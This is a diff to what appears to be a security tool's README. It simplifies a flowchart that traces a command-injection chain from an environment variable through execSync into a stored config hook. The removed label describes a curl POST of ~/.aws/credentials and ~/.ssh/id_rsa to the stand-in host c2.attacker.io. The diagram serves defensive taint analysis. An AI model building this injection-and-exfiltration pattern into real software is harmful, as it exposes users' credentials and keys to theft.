@@ -98,13 +98,13 @@ The following diagram represents the real-world CVE chain this engine was design
 
 ```mermaid
 flowchart TD
-    A["🔴 SOURCE\nprocess.env.DG_REGISTRY\nresolver.ts:6"] -->|DIRECT_FLOW| B["🟡 PASSTHROUGH\n\`curl -s \"\${registry}/…\"\`\nresolver.ts:10"]
-    B -->|TRANSFORM_FLOW| C["🔴 SINK ①\nexecSync(cmd)\nresolver.ts:10\nDG-2024-001"]
-    C -->|Payload executes| D["🟠 STORE\nfs.writeFileSync\n~/.depguard/config.json\npreScanHook: 'curl ...'"]
-    D -->|"STORED_FLOW\n⚡ SESSION BOUNDARY ⚡"| E["🟠 LOAD\nJSON.parse readFileSync\nconfig.json\nSession B"]
-    E -->|STORED_FLOW| F["🟡 PASSTHROUGH\nconfig.preScanHook\ntaint inherited"]
-    F -->|CALL_FLOW| G["🔴 SINK ②\nexecSync(config.preScanHook)\nconfig.ts:24\nDG-2024-003"]
-    G -->|Exfiltration| H["💀 EXFIL\ncurl POST c2.attacker.io\n~/.aws/credentials\n~/.ssh/id_rsa"]
+    A["SOURCE\nprocess.env.DG_REGISTRY\nresolver.ts:6"] -->|DIRECT_FLOW| B["PASSTHROUGH\ncurl -s registry/pkg/latest\nresolver.ts:10"]
+    B -->|TRANSFORM_FLOW| C["SINK 1 - DG-2024-001\nexecSync - cmd\nresolver.ts:10"]
+    C -->|Payload executes| D["STORE\nfs.writeFileSync\n.depguard/config.json\npreScanHook injected"]
+    D -->|"STORED_FLOW - SESSION BOUNDARY"| E["LOAD\nJSON.parse readFileSync\nconfig.json - Session B"]
+    E -->|STORED_FLOW| F["PASSTHROUGH\nconfig.preScanHook\ntaint inherited"]
+    F -->|CALL_FLOW| G["SINK 2 - DG-2024-003\nexecSync preScanHook\nconfig.ts:24"]
+    G -->|Exfiltration| H["EXFIL\ncurl POST attacker\naws credentials\nssh keys"]
 
     style A fill:#ff4444,color:#fff
     style C fill:#ff4444,color:#fff
